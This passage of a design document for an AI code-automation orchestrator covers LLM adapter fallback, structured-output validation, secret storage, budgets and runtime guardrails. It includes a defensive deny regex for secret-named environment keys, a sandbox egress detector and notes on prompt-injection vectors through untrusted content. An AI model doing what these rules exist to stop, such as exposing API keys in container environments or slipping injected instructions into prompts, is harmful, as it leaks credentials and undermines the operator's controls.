7. **Passing secrets via `docker run --env KEY=value`** — visible in `docker inspect .Config.Env`, violates SEC-01 SC #6. **Mitigation:** D-134 `Kiln.Sandboxes.EnvBuilder` enforces ALLOWLIST (`DTU_BASE_URL`, `DTU_TOKEN`, `MIX_ENV=test`, `LANG=en_US.UTF-8`) + regex-denies any key matching `~r/(api_key|secret|token|authorization|bearer)/i`; sandbox uses `--env-file <priv/run/<stage_run_id>.env>` (chmod 0600, deleted at tx end).

8. **Leaving `count_tokens` as "authoritative" for billing** — Anthropic's `/v1/messages/count_tokens` is free + independently rate-limited, BUT the billed token count can differ from the pre-flight count (vision/tool_use expansion, prompt caching, cached reads). **Mitigation:** Always record server-reported `usage.input_tokens` + `usage.output_tokens` from the actual Messages response into `stage_runs.tokens_used_usd`; count_tokens is ADVISORY only (BudgetGuard input), never the billing source of truth.

**Core Pattern:**

Every stage execution follows this sequence. The pattern is designed so that the happy path is 5 function calls and every failure mode raises a typed `Kiln.Blockers.Block` or returns a tagged tuple — no silent continuation.

```elixir
# The one-true stage invocation path (elaborated in Kiln.Stages.StageWorker):
def execute_stage(stage_run, run) do
  # 1. BUILD provider-neutral prompt from stage contract + artifacts (no provider shape yet).
  prompt = Kiln.Agents.Prompt.build(stage_run, run)

  # 2. PRE-FLIGHT budget check — free Anthropic count_tokens + Kiln.Pricing.estimate_usd.
  #    Raises Kiln.Blockers.Block{reason: :budget_exceeded} on breach — no override env var.
  :ok = Kiln.Agents.BudgetGuard.check!(run, prompt)

  # 3. RESOLVE adapter + model from preset → role.
  #    %{model, fallback, tier_crossing_alerts_on, fallback_policy} per D-105.
  {adapter_mod, requested_model, fallback_chain} =
    Kiln.ModelRegistry.resolve_adapter(run.model_profile_snapshot, prompt.role)

  prompt = %{prompt | model: requested_model}
  opts = [
    run_id: run.id,
    stage_id: stage_run.id,
    requested_model: requested_model,
    actual_model_used: requested_model,   # updated on fallback
    fallback_chain: fallback_chain
  ]

  # 4. INVOKE with same-provider fallback on 429/5xx/context_length/content_policy (D-106).
  case invoke_with_fallback(adapter_mod, prompt, opts) do
    {:ok, %Kiln.Agents.Response{} = response} ->
      # 5. PERSIST inside stage-completion transaction:
      #    - stage_runs: requested_model, actual_model_used, tokens_used_usd (server-reported)
      #    - audit: one event per fallback (model_routing_fallback) + stage_completed
      #    - artifacts: Harvester streams /workspace/out → CAS (D-113)
      #    - dispatch: NextStageDispatcher enqueues downstream stages (D-144)
      Kiln.Stages.Transitions.complete!(stage_run, response)

    {:error, {:fallback_exhausted, attempts}} ->
      # Stage :failed + diagnostic artifact (prompt + errors + trace) captured via Artifacts.
      Kiln.Stages.Transitions.fail!(stage_run, {:model_unavailable_all_tiers, attempts})

    {:error, reason} ->
      # Everything else: typed block or plain :failed per reason classification.
      Kiln.Stages.Transitions.fail!(stage_run, reason)
  end
end

# Fallback loop — single-model attempt wraps every call in :telemetry.span.
defp invoke_with_fallback(adapter_mod, prompt, opts, attempt \\ 1) do
  case adapter_mod.complete(prompt, opts) do
    {:ok, response} ->
      {:ok, response}

    {:error, reason} when reason in [:rate_limit_429, :provider_5xx, :connection_error,
                                     :timeout, :context_length_exceeded, :content_policy_violation] ->
      case Kiln.ModelRegistry.next(opts[:fallback_chain], opts[:actual_model_used]) do
        {:ok, next_model, tier_crossed?} ->
          # Emit model_routing_fallback audit event with full payload (D-106).
          Kiln.Audit.append!(%{
            kind: :model_routing_fallback,
            payload: %{
              stage_run_id: opts[:stage_id], run_id: opts[:run_id], role: prompt.role,
              requested_model: opts[:requested_model], actual_model_used: next_model,
              fallback_reason: reason, tier_crossed: tier_crossed?,
              attempt_number: attempt, provider_http_status: http_status_of(reason),
              wall_clock_ms: wall_clock_of(opts)
            }
          })

          prompt = %{prompt | model: next_model}
          opts = Keyword.put(opts, :actual_model_used, next_model)
          invoke_with_fallback(adapter_mod, prompt, opts, attempt + 1)

        :exhausted ->
          {:error, {:fallback_exhausted, attempt}}
      end

    {:error, other} ->
      {:error, other}
  end
end
```

**Tool Use:**

P3 ships the adapter-level tool-call request shape (so agents CAN declare tools) but does NOT enforce per-role tool allowlists — that's Phase 4's agent-role concern. The shape per Anthropix 0.6.2 (verified hexdocs.pm/anthropix):

```elixir
# Tool definition (Anthropic native shape; record natively, normalise only at telemetry emission).
%{
  name: "write_file",                     # required; tool identifier
  description: "Write content to a file under /workspace/out.",
  input_schema: %{                        # required; JSON Schema Draft 2020-12
    type: "object",
    properties: %{
      path: %{type: "string"},
      content: %{type: "string"}
    },
    required: ["path", "content"]
  }
  # :cache_control — optional prompt-caching key
}

# Response: `stop_reason: "tool_use"` + content block with %{type: "tool_use", id, name, input}.
# The adapter surfaces the native shape on %Response{}; the StructuredOutput facade applies
# JSV Draft 2020-12 validation as defense-in-depth against provider drift.
```

**Adapter behaviour contract boundary:** the Anthropic `tool_use` request shape and the OpenAI `function_call` shape differ enough that translating between them in the adapter layer is lossy (argument order, strict-mode semantics, `cache_control` placement). Per D-101/D-102, the adapter surfaces the NATIVE provider shape on the `%Response{}` — normalization happens ONLY at the telemetry emission boundary for cross-provider aggregation, not at the semantic payload level.

**Structured output (D-104):** `Kiln.Agents.StructuredOutput.request/2` facade dispatches per-provider:

- **Anthropic (2026 preferred):** `output_config: %{format: %{type: "json_schema", schema: ...}}` in the Messages body — guaranteed-valid JSON in `response.content[0].text`.
- **Anthropic (fallback for older models):** `tool_use` with a single "respond" tool + `strict: true`.
- **OpenAI:** `response_format: %{type: "json_schema", json_schema: %{name, strict: true, schema}}`.
- **Gemini:** `generationConfig.responseSchema` + `responseMimeType: "application/json"`.
- **Ollama:** `format: "json"` + JSV post-validation + 1 retry (counts against stage budget) — gated on `Adapter.capabilities().json_schema_mode == false`.

JSV Draft 2020-12 validation runs post-call on every provider's response as defense-in-depth. A validation failure after 1 retry = stage `:failed` with diagnostic artifact.

**State Management:**

- **Postgres is the source of truth.** Every state transition (stage queued/running/completed/failed/blocked) runs inside an Ecto transaction that updates `stage_runs`, writes an `Audit.Event`, and optionally harvests artifacts — all committed together or rolled back together. Per CLAUDE.md: if every BEAM process died now, a fresh boot continues every in-flight run from its last checkpoint.
- **Secrets live in `:persistent_term`** (write-once at boot via `config/runtime.exs` → `Kiln.Secrets.put/2`). Never in ETS, never in GenServer state, never in `Process.put`. The `%Kiln.Secrets.Ref{name: atom}` struct is the only cross-boundary carrier; raw string lives exclusively inside `reveal!/1`'s stack frame.
- **Registries live in compile-time `priv/<thing>/v1/` files** loaded via `@external_resource` — this is P3's 4th instance of the pattern (audit schemas, stage contracts, workflow schemas, now playbooks). Mix recompiles on edit; JSV validates frontmatter/schema at compile time.
- **ModelRegistry presets** load at boot (runtime-loaded `.exs` files, NOT compile-time config — respects no-`Mix.env()`-at-runtime ban per D-151). Cached in `:persistent_term` for zero-lookup-overhead resolution.
- **No new Ecto tables in P3.** All new state is compile-time or `persistent_term`; the only DB touch is audit-event extensions (25 → 30 kinds per D-145) which are pure source additions, not migrations.
- **`Kiln.Agents.SessionSupervisor`** is a `DynamicSupervisor` shipped empty in P3 (the child spec exists but no children are started). Phase 4 populates it with `Mayor/Planner/Coder/Tester/Reviewer/UIUX/QAVerifier` role GenServers — the SUPERVISION shape is locked now so P4 doesn't disturb `Kiln.Application.start/2`.
- **Telemetry context propagation across Oban boundaries** uses `opentelemetry_process_propagator.fetch_parent_ctx(1, :"$callers")` inside `StageWorker.perform/1` so every `[:kiln, :agent, :call, :*]` span links back to the enqueueing transition (mitigates PITFALLS P17).

**Context Window Strategy:**

Kiln is a Code-Automation Orchestrator, not RAG. The context-window problem manifests differently than in document-Q&A systems:

- **Per-stage context isolation** — each stage gets a freshly-built `%Prompt{}` from declared `input_artifacts` via `Kiln.Sandboxes.Hydrator`. There is NO long-lived conversation history crossing stage boundaries in P3 — that's an anti-pattern this architecture deliberately rejects. Work-unit → work-unit context threading lives in Phase 4's `Kiln.Agents.Mayor` (via shared-notes pattern per ARCHITECTURE.md §8), not in the adapter.
- **Pre-flight size check** — `BudgetGuard.check!/2` calls `Anthropix.count_tokens/1` BEFORE the request. A prompt whose `input_tokens` plus the model's `max_tokens` exceeds the model's context window is a `:context_length_exceeded` fallback trigger (D-106) → ModelRegistry attempts a larger-context sibling (e.g., Sonnet → Opus for long-context jobs); exhaustion → stage `:failed` with the prompt persisted as a diagnostic artifact.
- **Content-addressed artifact references, not inlined content** — when a stage needs to "see" another stage's output, it receives the `artifact_ref` (sha256 + size + content_type), not the bytes. The agent can ask the adapter to include the content by `artifact_ref` at prompt-build time; Kiln decides whether to inline (small artifacts), summarize (large text artifacts — Phase 4's Mayor concern), or stream-read from CAS.
- **Prompt caching** — Anthropix 0.6.2 supports `cache_control` blocks. For the large system prompts that the same role uses across many stages (coder/tester/reviewer), declare `%{type: "text", text: system_prompt, cache_control: %{type: "ephemeral"}}` to halve per-call token costs on cache hits. Pricing tables in `priv/pricing/v1/anthropic.exs` carry `cache_write_per_mtok_usd` + `cache_read_per_mtok_usd` so BudgetGuard estimates correctly.
- **Streaming is a UX concern, not a context-window concern** — `stream/2` returns an `Enumerable` (D-103 passthrough). P3 does not summarize, truncate, or rerank during streaming because there is no consumer yet (Phase 4 work units, Phase 7 LiveView). Accumulating chunks into a final response for JSV validation uses `Enum.reduce/3` at the consumer, not inside the adapter.

## 4b. AI Systems Best Practices

> Written by `gsd-ai-researcher`. Cross-cutting patterns every developer building AI systems needs — here specialized for Elixir/OTP. "Pydantic" is the reference point for Python systems; the Elixir equivalent is a LAYERED approach — JSV at the LLM-response boundary, Ecto changesets for internal coercion, behaviour contracts for the adapter seam.

### Structured Outputs with JSV + Ecto + Behaviour Contracts (Elixir equivalent of "Pydantic")

Elixir's Pydantic equivalent is not a single library — it's three layers used at different boundaries:

1. **JSV (Draft 2020-12) at the LLM-response boundary** — the wire format is JSON, the tool is a JSON Schema validator. Kiln already uses JSV for workflow YAML + audit events + stage contracts + DTU responses (now the 5th use-site for structured-output validation).
2. **Ecto changesets for internal coercion** — applied AFTER JSV validation passes, when the response becomes an internal domain struct. Changesets are NOT called at the LLM boundary itself (that's what JSV is for); they're called when the validated JSON becomes a `%Kiln.Agents.ParsedResponse{}` or similar.
3. **`Kiln.Agents.Adapter` behaviour contract** — defines `%Prompt{}` and `%Response{}` as opaque-ish structs; the behaviour's callback specs are the compile-time guarantee that every adapter returns the same shape. This is the Pydantic-model-as-contract equivalent at the ADAPTER seam.

**Canonical structured-output flow for P3 (a planner role emitting a structured "plan" payload):**

```elixir
# lib/kiln/agents/structured_output.ex — the facade per D-104
defmodule Kiln.Agents.StructuredOutput do
  @doc """
  Request a structured response. Dispatches to the adapter's native structured-output
  mode (Anthropic output_config / OpenAI response_format / Gemini responseSchema / Ollama prompted-JSON),
  then JSV-validates as defense-in-depth, with 1 retry on validation failure.
  """
  @spec request(map(), keyword()) :: {:ok, map()} | {:error, term()}
  def request(schema, opts) do
    adapter = Keyword.fetch!(opts, :adapter)
    prompt = Keyword.fetch!(opts, :prompt)
    model = Keyword.fetch!(opts, :model)

    # JSV schema is compiled once, cached.
    {:ok, compiled_schema} = JSV.build(schema)

    case invoke_structured(adapter, prompt, model, schema, opts) do
      {:ok, %Kiln.Agents.Response{content: json_str}} ->
        with {:ok, decoded} <- Jason.decode(json_str),
             :ok <- JSV.validate(decoded, compiled_schema) do
          {:ok, decoded}
        else
          {:error, _json_err} ->
            maybe_retry(adapter, prompt, model, schema, opts, :invalid_json)

          {:error, jsv_errors} ->
            maybe_retry(adapter, prompt, model, schema, opts, {:jsv_validation, jsv_errors})
        end

      {:error, reason} ->
        {:error, reason}
    end
  end

  # ONE retry counted against stage budget; on second failure, fail stage with diagnostic.
  defp maybe_retry(adapter, prompt, model, schema, opts, reason) do
    attempt = Keyword.get(opts, :retry_attempt, 0)

    Kiln.Audit.append!(%{
      kind: :structured_output_validation_failed,
      payload: %{
        reason: inspect(reason), attempt: attempt,
        run_id: opts[:run_id], stage_id: opts[:stage_id]
      }
    })

    if attempt >= 1 do
      {:error, {:structured_output_exhausted, reason}}
    else
      request(schema, Keyword.put(opts, :retry_attempt, attempt + 1))
    end
  end
end

# Example schema for a planner-role "implementation plan" response:
plan_schema = %{
  "$schema" => "https://json-schema.org/draft/2020-12/schema",
  type: "object",
  required: ["work_units", "estimated_effort_hours", "risks"],
  properties: %{
    work_units: %{
      type: "array",
      minItems: 1,
      items: %{
        type: "object",
        required: ["id", "title", "acceptance_criteria"],
        properties: %{
          id: %{type: "string", pattern: "^WU-[0-9]+$"},
          title: %{type: "string", maxLength: 120},
          acceptance_criteria: %{type: "array", items: %{type: "string"}, minItems: 1}
        }
      }
    },
    estimated_effort_hours: %{type: "number", minimum: 0},
    risks: %{type: "array", items: %{type: "string"}}
  }
}

# Call site:
{:ok, plan} = Kiln.Agents.StructuredOutput.request(plan_schema,
  adapter: Kiln.Agents.Adapter.Anthropic,
  model: "claude-opus-4-5",
  prompt: prompt,
  run_id: run.id,
  stage_id: stage_run.id
)

# Internal coercion via changeset (OPTIONAL — only if `plan` becomes a persistent %Plan{}):
changeset = Kiln.Plans.Plan.changeset(%Kiln.Plans.Plan{}, plan)
```

**Retry logic:**

- **Total retries: 1** on JSV validation failure OR JSON parse failure. One retry is sufficient because providers' native structured-output modes already hit the 3% error rate (Mastra 2026 study); extra retries burn budget without proportional gain.
- **What to log:** `structured_output_validation_failed` audit event with `{attempt, reason, run_id, stage_id}`. Reason is either `:invalid_json` or `{:jsv_validation, [paths]}` — preserve enough detail to debug without leaking prompt content to the log.
- **When to surface:** On second failure, return `{:error, {:structured_output_exhausted, reason}}` from `StructuredOutput.request/2`; the StageWorker transitions the stage to `:failed` with a diagnostic artifact capturing the final failing response + the JSV error list. NO silent downgrade to prose parsing. If the operator sees `structured_output_exhausted` repeatedly for a given role, the schema or system prompt needs attention.

**Where NOT to use changesets:** at the LLM boundary itself. Changesets are designed for validating user-submitted form data, not for asserting that a vendor's API returned the shape its own docs promise. JSV is the correct tool at the wire; changesets are for internal coercion to domain structs AFTER JSV has passed.

### Async-First Design (Elixir/OTP)

In Elixir there is no `async/await` — every BEAM process IS concurrent by default. The mistakes are different from Python's:

- **Common mistake #1: calling a synchronous HTTP client from a GenServer that handles many runs.** A `Req.post/2` inside `handle_call/3` blocks that GenServer for the entire LLM round-trip (seconds to minutes). Kiln avoids this by making every LLM call happen from an **Oban job** (`StageWorker.perform/1`), which runs in its own spawned process — one slow call doesn't block other stages. Never put `Adapter.complete/2` inside `RunDirector.handle_call/3`.

- **Common mistake #2: `Task.await/1` with `:infinity` or inside a supervised worker.** A hung LLM call with `Task.await(task, :infinity)` leaks the task and blocks the caller forever. Use `Task.yield/2` + `Task.shutdown/2` pattern, OR — preferably in Kiln's architecture — don't use `Task` at all: let Oban's `max_attempts` + per-job timeout be the backstop, and the adapter's `receive_timeout: 120_000` be the soft limit.

- **Common mistake #3: shared mutable state between concurrent stages.** Two stages can run in parallel (`:stages` queue has concurrency N). Anything stored in a global ETS table or module attribute is a race. Kiln's answer: Postgres rows + `SELECT … FOR UPDATE` for state transitions (P1 D-90 pattern), `:persistent_term` for read-only registries, and `Registry` (the stdlib one, already in the tree as `Kiln.RunRegistry`) for process-name lookup.

- **Common mistake #4: blocking the caller with `Enumerable` materialization.** `stream/2` returns a lazy Enumerable; calling `Enum.to_list/1` on it synchronously materializes all chunks into memory. For aggregation, use `Enum.reduce/3` inside the consumer with bounded accumulation; for relay, use `Stream.each/2` (what `Adapter.Anthropic.stream/2` does for telemetry).

**Stream vs. await — when to use which:**

- **Await (`complete/2`)** — when you need structured output (JSV validation requires the full response) OR when the downstream consumer doesn't benefit from incremental updates (tester role evaluating a test suite).
- **Stream (`stream/2`)** — when a human (Phase 7 LiveView) or a coarse consumer (Phase 4 work-unit event log) will observe progress. In P3, the only stream consumer is `[:kiln, :agent, :stream, :chunk]` telemetry. Streaming a structured-output response and validating chunk-by-chunk is an anti-pattern in P3 — `complete/2` the structured path, `stream/2` the prose path.

**Finch pool backpressure:** each provider's per-host pool (configured inside the single `Kiln.Finch` child — per D-109 amendment) has a fixed size (default ~10 connections; tune during P3 planning per provider's documented rate-limit). When the pool is exhausted, `Req.post/2` blocks the caller — this IS the backpressure signal. Don't paper over it with `Task.async_stream/3` at the call site; instead, size the pool deliberately and let Oban queue depth absorb bursts.

### Prompt Engineering Discipline

- **System vs. user prompt separation:** every `%Kiln.Agents.Prompt{}` carries `system_prompt: String.t()` distinct from `content: [user_message, ...]`. The system prompt is the role+constraint spec (set per agent role by `Kiln.Agents.Prompt.build/2` using role-specific templates); the user message is the stage-specific ask + artifact content. Mixing them is a P8 prompt-injection vector — untrusted artifact content in the system prompt slot lets an agent be redirected.

- **Untrusted-content wrappers (Phase 4 groundwork in P3):** content that originated outside Kiln (a spec file, an agent's prior output loaded via `artifact_ref`) should be wrapped in `<untrusted_content source="...">` markers at prompt-build time. P3 ships the `%Prompt{}` struct shape that supports this (separate `content` blocks with `trust_level: :trusted | :untrusted` metadata); Phase 4's agent-role prompt builders WRITE the wrappers. P3 adapter layer does NOT mutate content.

- **Few-shot guidance: inline for small + stable, dynamic retrieval for large + evolving.** P3's roles (planner/coder/tester/verifier) use inline few-shot examples baked into the role's system prompt template (3–5 exemplars; checked into source). Dynamic retrieval of prior-run examples is Phase 4+ (requires the work-unit store to query against).

- **`max_tokens` is ALWAYS explicit.** Per the Model Configuration table above — every role has a per-role `max_tokens` enforced at preset-validation time. Unbounded `max_tokens` is a cost-runaway vector (P2) AND a latency vector (Anthropic/OpenAI will happily generate 8K tokens when 500 would suffice). BudgetGuard's pre-flight uses `max_tokens` as `estimated_output_tokens` input to `Kiln.Pricing.estimate_usd/3`.

- **Prompt caching for shared system prompts.** Anthropix 0.6.2 supports `%{type: "text", text: ..., cache_control: %{type: "ephemeral"}}` for expensive system prompts reused across many stages in a run. For Kiln's coder role (which may invoke 20+ times per run with the same ~2K-token system prompt), caching halves per-call cost after the first hit. The pricing table's `cache_write_per_mtok_usd` and `cache_read_per_mtok_usd` columns exist for this reason.

- **Model-specific prompt idioms.** Anthropic prefers XML-tag structure (`<task>`, `<constraints>`, `<examples>`); OpenAI prefers markdown headers; Gemini prefers numbered lists. The per-role prompt templates live in `priv/prompts/v1/<role>.ex.eex` (Phase 4 creates; P3 ships the path but not the content). Adapter layer is prompt-idiom-agnostic — the role-level code handles provider-specific formatting.

- **Never interpolate user-controlled strings into prompts without escaping.** Agent-generated code injected into a verifier prompt is P8 prompt-injection. In practice for P3: all `artifact_ref` content is loaded from CAS (which is immutable by definition) and wrapped in untrusted-content markers at Phase 4; P3 does not load arbitrary user-string into the prompt struct.

### Context Window Management

Kiln is Code-Automation Orchestration, not RAG/Conversational — different invariants apply.

- **No cross-stage conversation history in P3.** Each stage's prompt is freshly built from declared `input_artifacts` per the stage's input contract. If stage B needs stage A's output, it declares `input_artifacts: [{artifact_ref, logical_name}]` in the workflow YAML; the Hydrator materializes into `/workspace` and the prompt builder references it. There is no "memory" abstraction — the architectural thesis rejects it.

- **Context overflow handling:**
  1. `BudgetGuard.check!/2` calls `count_tokens` pre-flight. If `input_tokens + max_tokens > model_context_window`, raise `:context_length_exceeded` BEFORE the call (cheap fail).
  2. If the provider returns `:context_length_exceeded` post-call (Anthropic sometimes does on borderline requests), treat as a fallback trigger per D-106 → ModelRegistry attempts a larger-context sibling if available.
  3. If the fallback chain is exhausted at context-length, stage transitions `:failed` with diagnostic artifact + `:model_unavailable_all_tiers` block reason. The operator's remediation: split the workflow stage into smaller stages, or declare a longer-context preset in the workflow YAML. No silent summarization.

- **Artifact inlining vs. summarization vs. streaming:**
  - **Inline** (byte-for-byte) — for small artifacts (<10KB or below a configured threshold). Agent sees exact content.
  - **Summarize** — Phase 4's Mayor concern, not P3's. If an artifact is too large to inline, P3 simply declines; Phase 4's work-unit architecture handles summarization via dedicated summarizer stages.
  - **Stream-read from CAS** — artifacts can be referenced by `artifact_ref` and loaded on demand when the agent's tool_call requests them (Phase 4 tool shape). P3 ships the plumbing (`Kiln.Artifacts.read_stream/1`) but not the tool.

- **Prompt caching** (see Prompt Engineering Discipline) — reuses repeated system-prompt prefixes across a run's stages, effectively expanding the usable "context budget" without growing the window.

- **Per-role max_tokens ceiling** — enforced at preset-validation time. Verifier role gets 2048; coder gets 8192. A role demanding more is a design smell (split the role, not the budget).

### Cost and Latency Budget

**Per-call cost estimate (Phase 3 representative workloads, April 2026 Anthropic pricing — subject to `priv/pricing/v1/anthropic.exs` refresh):**

| Stage kind | Model | Input tokens (typical) | Output tokens (typical) | Cost/call (USD) | Latency p50 | Latency p95 |
|------------|-------|------------------------|-------------------------|-----------------|-------------|-------------|
| Planning (plan_work) | `claude-opus-4-5` | 3,000 | 2,000 | ~$0.150 | 4s | 12s |
| Coding | `claude-sonnet-4-5` | 4,000 | 4,000 | ~$0.036 | 6s | 25s |
| Testing | `claude-sonnet-4-5` | 3,500 | 2,000 | ~$0.021 | 5s | 18s |
| Verification | `claude-haiku-4-5` | 2,500 | 1,000 | ~$0.0035 | 2s | 6s |
| Reviewing | `claude-sonnet-4-5` | 5,000 | 2,000 | ~$0.030 | 5s | 20s |

**Cost ceiling per run (budget pre-flight reference):** a typical 10-stage coding workflow runs ~$0.50–$1.50 at the above mix. `caps_snapshot.max_tokens_usd` defaults are set at preset level (e.g., `bugfix_critical: $5.00`, `phoenix_saas_feature: $10.00`). Solo-operator local-first means the budget ceiling exists to prevent catastrophic loops (stuck retry burning $100), not to squeeze marginal cost.

**Caching strategy:**

- **Exact-match cache (Anthropic prompt caching):** `cache_control: %{type: "ephemeral"}` on repeated system prompts. Ephemeral cache lives ~5 min per Anthropic docs; for a run doing 10 coder invocations in 2 min with the same system prompt, hits 9 out of 10 calls. Savings: ~50% of input-token cost on cache hits (Anthropic's cache-read rate is ~10% of uncached input rate).
- **Semantic cache: NOT in P3.** Semantic caching (embedding-based matching of "similar" prompts) is NOT part of Kiln's architecture — it introduces nondeterminism into a system whose acceptance oracle is deterministic. Revisit if v1.5+ workflows exhibit high prompt redundancy that ephemeral cache doesn't capture.
- **Response cache: NOT in P3.** Stage outputs are recorded as `artifact_ref` in CAS, which is content-addressed by definition — identical stage inputs that produce identical outputs are already deduplicated at the artifact layer. No separate LLM response cache is needed.

**Cheaper models for sub-tasks (already baked into the preset design):**

- **Verifier role uses Haiku by default** — verification is classification ("does this output satisfy the spec?"), not generation. Haiku is 30× cheaper than Sonnet and adequate.
- **Routing/classification sub-calls within a stage** — if an agent needs a fast classification (e.g., "is this a test file or a source file?"), use Haiku directly. Phase 4's per-role tool definitions MAY expose a `classify_with_cheap_model/2` helper; P3 doesn't ship the helper but the adapter behaviour supports arbitrary model overrides per-call via `opts[:model_override]`.
- **No auto-downgrade for cost.** Model selection is DETERMINISTIC per preset — fallback only happens on 429/5xx/context/content-policy errors, never proactively to save money. Operator controls spend via preset choice + `caps_snapshot`, not via adapter heuristics.

**Latency budget:**

- **P3 aggregate latency target:** a 10-stage bugfix_critical workflow completes in <5 min wall-clock (per Phase 9 dogfood spec). Per-call latency p95 budgets (above) compose roughly linearly — 10 stages × 20s p95 = ~3 min; remaining budget covers sandbox launch/teardown (~2s per stage) + Hydrator/Harvester CAS I/O (<1s per stage).
- **Latency observability:** every `[:kiln, :agent, :call, :stop]` span carries `duration_native`; LiveDashboard aggregates p50/p95/p99 per role. Thresholds alert via Phase 8 cost-intel panel.
- **Streaming DOES NOT improve time-to-first-token for P3** — there is no LiveView consumer in P3 to surface incremental chunks. Streaming is scaffolded for Phase 7; in P3 it ONLY emits telemetry. Don't conflate "the adapter supports streaming" with "the user sees tokens faster" — that's Phase 7.

- **No KILN_BUDGET_OVERRIDE escape hatch.** Per D-138, budget breaches halt with typed block `:budget_exceeded` and the prescribed loop is "review spend in `/ops/dashboard`, edit workflow caps, restart run." This is the least-surprise behaviour for a 2am solo operator — "I want to be stopped, not to have to remember I set an override."

## 5. Evaluation Strategy

> **Scope discipline.** This phase evaluates *infrastructure*, not LLM output quality. Rubrics measure whether the adapter seam, sandbox driver, secret store, budget guard, fallback discipline, block-reason surface, lifecycle hygiene, and DTU contract behave correctly under adversarial conditions. Prompt/response-quality evaluation (RAG faithfulness, answer-relevance, hallucination, tone) is explicitly **deferred to Phase 7+** where actual LLM-output consumers exist; Arize Phoenix / RAGAS / Langfuse / Promptfoo are the **wrong tools for P3** and are noted here only to record that deferral. ## 6. Guardrails

### Online (Real-Time)

> Classified per `ai-evals.md`: "If this behavior goes wrong, would it be catastrophic?" For P3 infrastructure, catastrophic = (key revocation / cost runaway / egress breach / silent model drift / audit-chain break). Each guardrail runs on EVERY relevant call and is measurable by a named test harness.

| Guardrail | Trigger | Intervention |
|-----------|---------|--------------|
| **BudgetGuard pre-flight** (D-138) | Every `Kiln.Agents.Adapter.*.complete/2` and `stream/2` call path. Invoked by `Kiln.Stages.StageWorker.perform/1` immediately before adapter dispatch. Check = `input_tokens * input_price + max_tokens * output_price <= caps_snapshot.remaining_usd`. | **Block.** Raises `Kiln.Blockers.Block` with `reason: :budget_exceeded`, payload `{limit_usd, estimated_usd, actual_remaining_usd, prompt_token_count}`. Stage transitions `:failed`; run is paused; typed block reason routes to `priv/playbooks/v1/budget_exceeded.md`. NO `KILN_BUDGET_OVERRIDE` env-var escape hatch exists (D-138). |
| **Secret `reveal!/1` AST audit** (D-131, D-132, D-133 layer 1) | Compile-time, every `mix compile`. `Kiln.Secrets.Auditor` walks the AST and enforces: (a) every `Kiln.Secrets.reveal!/1` return value is a DIRECT argument to an `Anthropix.*` / `Req.*` / HTTP-client call — never bound to a variable; (b) the total grep-count of `reveal!/1` call sites equals the live-provider count (P3: 3). | **Block.** Emits `CompileError` with the offending module/line/function. Merge-blocking via `mix check`. A new `reveal!/1` call site requires security-reviewer sign-off (process gate, not technical gate — recorded in PR description). |
| **Block-reason type gate** (D-135, D-136, BLOCK-01) | Every unblock HTTP POST to `/ops/runs/:id/unblock` (Phase 8 stub present in P3). Body must parse to `{reason: atom, remediation_playbook_id: uuid}` where `reason ∈ Kiln.Blockers.Reason.all/0` (the closed 9-atom enum). | **Block (422).** Rejects with structured error `{error: "invalid_block_reason", valid_reasons: [...], received: "..."}` — never echoes the freeform input back. Compile-time exhaustiveness check via Elixir's atom pattern-match warning ensures no consumer falls through to a generic branch. |
| **Model drift audit event** (D-105, D-106, D-107) | Every adapter fallback attempt (429 / 5xx / `context_length_exceeded` / `content_policy_violation`). Emitted from `Kiln.ModelRegistry.next/2` inside the same Postgres transaction as the stage row update. Cross-tier boundary (Opus → Sonnet = same-tier; Sonnet → Haiku = CROSS-tier per the 3-tier table in D-135) triggers a `:warning`-severity telemetry event `[:kiln, :agent, :fallback, :cross_tier]`. | **Flag + Escalate.** Writes one `model_routing_fallback` audit event (required); on CROSS-tier specifically, emits `:warning`-severity telemetry that `Kiln.Notifications.desktop/2` subscribes to (D-140) and fires an osascript (macOS) / notify-send (Linux) desktop alert with the run_id + tier-crossing delta. Non-blocking — the run proceeds — but every tier-crossing is operator-visible in real time. Slack webhook (optional, P7+) also subscribes. |
| **Sandbox egress attempt detector** (D-117, D-119 five-layer block) | Every TCP/UDP/DNS/ICMP/IPv6 egress attempt from a stage container that targets anything other than the DTU static IP 172.28.0.10. Detection is passive at the Docker bridge (iptables LOG rule + container-side `ss`/`conntrack` snapshot at stage-teardown). | **Block + Escalate.** Stage transitions `:failed`; run is halted with typed block `:policy_violation` (the 9-atom enum already covers this; no new atom needed); `priv/playbooks/v1/policy_violation.md` renders with the exact 5-tuple `{src_ip, dst_ip, dst_port, protocol, timestamp}`. Desktop notification fires. The `kiln.sandbox.egress_attempt` telemetry counter increments — **production baseline for this metric is 0**; any non-zero is a P0 investigation. |

### Offline (Flywheel)

> Per `ai-evals.md`: not catastrophic per individual event, but valuable as a quality signal over time. Sampled batches feed system refinement. For P3 substrate, the flywheel measures drift on external contracts (pricing pages, OpenAPI specs, fallback-rate baselines) — i.e., the things outside our code that can silently invalidate our assumptions.

| Metric | Sampling Strategy | Action on Degradation |
|--------|-------------------|----------------------|
| **Pricing-table drift check** (`mix kiln.pricing.check`) | **Weekly Oban cron** (scaffolded in P3 per D-146; cron-trigger enabled — P3 ships the body) + **every `mix check` run locally** (WARN-only exit code — never fatal in P3 per D-146; Phase 9 hardening may promote to fatal). Scrapes `docs.anthropic.com/en/api/pricing` + `openai.com/api/pricing` + `cloud.google.com/vertex-ai/pricing` and diffs against `priv/pricing/v1/<provider>.exs`. | **Drift detected** → opens a GitHub issue via `gh issue create` labeled `pricing-drift` with the diff table; emits `pricing_drift_detected` audit event; solo operator reviews and updates `priv/pricing/v1/<provider>.exs` + regenerates the pricing regression vectors (`test/support/fixtures/pricing/*.exs`). NEVER auto-updates — the fixture corpus is the integrity check and must be human-verified. |
| **DTU contract drift check** (`KilnDtu.ContractTest` Oban worker) | **Weekly Oban cron** (scheduled but cron-DISABLED in P3 per 03-CONTEXT.md D-125; body present + test-invocable; P6 flips the cron on). Fetches `github.com/anthropics/anthropic-sdk-python` HEAD OpenAPI spec + compares against `priv/dtu/contracts/github/api.github.com.2026-04.json` pinned snapshot. Flags new-required-field / removed-response-field / status-code-changed / new-enum-value. | **Drift detected** → emits `dtu_contract_drift_detected` audit event with `{endpoint, method, drift_kind, diff_summary}`; opens GitHub issue labeled `dtu-contract-drift`; does NOT update the snapshot automatically (snapshot refresh is a human-reviewed PR because it can ripple into 20 DTU fixtures). |
